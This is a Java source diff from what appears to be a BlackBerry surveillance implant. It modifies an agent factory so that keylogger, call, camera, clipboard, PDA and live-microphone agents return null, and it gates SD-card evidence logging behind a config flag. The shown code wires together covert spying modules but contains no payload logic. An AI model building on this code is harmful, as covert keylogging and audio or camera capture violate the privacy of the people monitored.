@@ -9,6 +9,7 @@
 package blackberry.agent;
 
 import blackberry.Status;
+import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -100,22 +101,25 @@ public abstract class Agent extends TimerJob {
                 return new PositionAgent(agentStatus, confParams);
             case AGENT_CALL:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_CALL "
+                debug.trace("NULL Factory *** AGENT_CALL "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif
-                return new CallAgent(agentStatus, confParams);
+                //return new CallAgent(agentStatus, confParams);
+                return null;
             case AGENT_CALL_LOCAL:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_CALL_LOCAL "
+                debug.trace("NULL Factory *** AGENT_CALL_LOCAL "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif
-                return new CallLocalAgent(agentStatus, confParams);
+                //return new CallLocalAgent(agentStatus, confParams);
+                return null;
             case AGENT_KEYLOG:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_KEYLOG "
+                debug.trace("NULL Factory *** AGENT_KEYLOG "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif
-                return new KeyLogAgent(agentStatus, confParams);
+                //return new KeyLogAgent(agentStatus, confParams);
+                return null;
             case AGENT_SNAPSHOT:
                 //#ifdef DEBUG
                 debug.trace("Factory *** AGENT_SNAPSHOT "
@@ -142,16 +146,18 @@ public abstract class Agent extends TimerJob {
                 return new MicAgent(agentStatus, confParams);
             case AGENT_CAM:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_CAM "
+                debug.trace("NULL Factory *** AGENT_CAM "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif
-                return new CamAgent(agentStatus, confParams);
+                //return new CamAgent(agentStatus, confParams);
+                return null;
             case AGENT_CLIPBOARD:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_CLIPBOARD "
+                debug.trace("NULL Factory *** AGENT_CLIPBOARD "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif
-                return new ClipBoardAgent(agentStatus, confParams);
+                //return new ClipBoardAgent(agentStatus, confParams);
+                return null;
             case AGENT_CRISIS:
                 //#ifdef DEBUG
                 debug.trace("Factory *** AGENT_CRISIS "
@@ -166,16 +172,18 @@ public abstract class Agent extends TimerJob {
                 return new ApplicationAgent(agentStatus, confParams);
             case AGENT_PDA:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_PDA "
+                debug.trace("NULL Factory *** AGENT_PDA "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif
-                return new PdaAgent(agentStatus, confParams);
+                //return new PdaAgent(agentStatus, confParams);
+                return null;
             case AGENT_LIVE_MIC:
                 //#ifdef DEBUG
-                debug.trace("Factory *** AGENT_LIVE_MIC "
+                debug.trace("NULL Factory *** AGENT_LIVE_MIC "
                         + (agentStatus ? "enabled" : "disabled") + " ***");
                 //#endif			
-                return new LiveMicAgent(agentStatus, confParams);
+                //return new LiveMicAgent(agentStatus, confParams);
+                return null;
             default:
                 //#ifdef DEBUG
                 debug.trace("AgentId UNKNOWN: " + agentId);
@@ -219,7 +227,7 @@ public abstract class Agent extends TimerJob {
         agentId = agentId_;
 
         logOnSD = logOnSD_;
-        evidence = logCollector.factory(this, logOnSD_);
+        evidence = logCollector.factory(this, logOnSD_ && Conf.SD_ENABLED);
 
         enable(agentEnabled);
     }
